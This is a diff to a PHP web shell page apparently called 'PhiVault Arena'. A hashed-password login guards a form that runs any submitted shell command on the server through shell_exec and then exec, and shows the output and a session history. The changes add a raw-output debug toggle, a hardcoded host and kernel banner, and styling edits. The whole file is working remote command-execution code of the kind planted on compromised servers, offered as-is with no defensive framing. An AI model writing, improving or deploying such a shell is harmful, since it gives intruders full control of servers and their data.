@@ -1,7 +1,6 @@
 <?php
 session_start();
 
-
 if (!isset($_SESSION['loggedin'])) {
     if (isset($_POST['pass'])) {
         if (hash("sha256", $_POST['pass']) === "68215fa3501ae17394bac692f12a5fe1cd6675a7c048d7307800956469f81057") {
@@ -22,7 +21,9 @@ if (!isset($_SESSION['loggedin'])) {
 $output = '';
 if (isset($_POST['cmd'])) {
     $cmd = $_POST['cmd'];
-    $output = shell_exec($cmd . " 2>&1");
+    // safer and complete error capture
+    exec($cmd . " 2>&1", $lines);
+    $output = implode("\n", $lines);
     $_SESSION['history'][] = ['cmd' => $cmd, 'output' => $output];
 }
 ?>
@@ -30,7 +31,7 @@ if (isset($_POST['cmd'])) {
 <!DOCTYPE html>
 <html>
 <head>
-    <title>That's PhiVault Arena !</title>
+    <title>WelCome To PhiVault Arena !</title>
     <style>
         body {
             background-color: black;
@@ -65,10 +66,15 @@ if (isset($_POST['cmd'])) {
         select {
             margin-right: 10px;
         }
+        .debug-toggle {
+            color: cyan;
+            margin-bottom: 10px;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
-    <h2>Welcome Master</h2>
+    <h2>Hello Master - This is Linux CVRaman73674 5.15.0-133-generic #144-Ubuntu SMP x86_64 GNU/Linux</h2>
 
     <!-- UI Customizer -->
     <div style="margin-bottom: 15px;">
@@ -97,6 +103,8 @@ if (isset($_POST['cmd'])) {
             <option value="500px">500px</option>
             <option value="600px">600px</option>
         </select>
+
+        <span class="debug-toggle" onclick="toggleDebug()">[ Toggle Debug Mode ]</span>
     </div>
 
     <!-- Output Terminal -->
@@ -105,7 +113,8 @@ if (isset($_POST['cmd'])) {
         if (!empty($_SESSION['history'])) {
             foreach ($_SESSION['history'] as $entry) {
                 echo "<span style='color:lime;'>$ " . htmlentities($entry['cmd']) . "</span><br>";
-                echo "<pre>" . htmlentities($entry['output']) . "</pre>";
+                echo "<pre class='cmd-output'>" . htmlentities($entry['output']) . "</pre>";
+                echo "<pre class='debug-output' style='display:none;color:#888;font-size:11px;'>[DEBUG] Raw: " . var_export($entry['output'], true) . "</pre>";
             }
         }
         ?>
@@ -126,13 +135,11 @@ if (isset($_POST['cmd'])) {
             const color = document.getElementById("textColor").value;
             const height = document.getElementById("panelHeight").value;
 
-            // Apply styles
             root.style.setProperty('--output-size', size);
             root.style.setProperty('--input-size', size);
             root.style.setProperty('--output-color', color);
             root.style.setProperty('--panel-height', height);
 
-            // Save to localStorage
             localStorage.setItem("fontSize", size);
             localStorage.setItem("textColor", color);
             localStorage.setItem("panelHeight", height);
@@ -153,9 +160,16 @@ if (isset($_POST['cmd'])) {
             document.getElementById("panelHeight").value = savedHeight;
         }
 
+        function toggleDebug() {
+            document.querySelectorAll(".debug-output").forEach(el => {
+                el.style.display = (el.style.display === "none") ? "block" : "none";
+            });
+        }
+
+        // Apply saved settings on load
         applySavedSettings();
 
-        // Auto scroll to bottom
+        // Auto scroll to latest
         const term = document.getElementById("terminal");
         term.scrollTop = term.scrollHeight;
     </script>
